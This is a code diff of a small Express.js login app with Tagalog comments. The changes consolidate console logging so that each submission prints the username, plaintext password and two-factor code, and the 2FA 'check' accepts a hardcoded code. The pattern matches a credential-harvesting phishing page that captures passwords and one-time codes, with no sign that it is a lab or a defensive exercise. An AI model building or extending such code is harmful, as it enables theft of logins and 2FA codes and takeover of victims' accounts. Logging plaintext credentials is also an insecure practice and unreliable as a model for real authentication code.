@@ -34,8 +34,7 @@ app.post('/submit', (req, res) => {
   req.session.password = password;
 
   // Log sa console
-  console.log(`Username: ${username}`);
-  console.log(`Password: ${password}`);
+  console.log(`Login Attempt - Username: ${username}, Password: ${password}`);
 
   // Redirect sa 2FA page
   res.redirect('/two-factor');
@@ -101,8 +100,6 @@ app.get('/two-factor', (req, res) => {
     <body>
       <div class="container">
         <h2>Two-Factor Authentication</h2>
-        <p><strong>Logged Username:</strong> ${req.session.username}</p>
-        <p><strong>Logged Password:</strong> ${req.session.password}</p>
         <form action="/verify-2fa" method="POST">
           <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
           <button type="submit">Verify</button>
@@ -117,9 +114,8 @@ app.get('/two-factor', (req, res) => {
 app.post('/verify-2fa', (req, res) => {
   const authCode = req.body['auth-code'];
 
-  console.log(`2FA Code: ${authCode}`);
-  console.log(`Username: ${req.session.username}`);
-  console.log(`Password: ${req.session.password}`);
+  // Log username, password, and 2FA code sa terminal
+  console.log(`2FA Verification Attempt - Username: ${req.session.username}, Password: ${req.session.password}, 2FA Code: ${authCode}`);
 
   if (authCode === '123456') { // Example valid code
     res.send('2FA Verification Successful! Welcome to your account.');
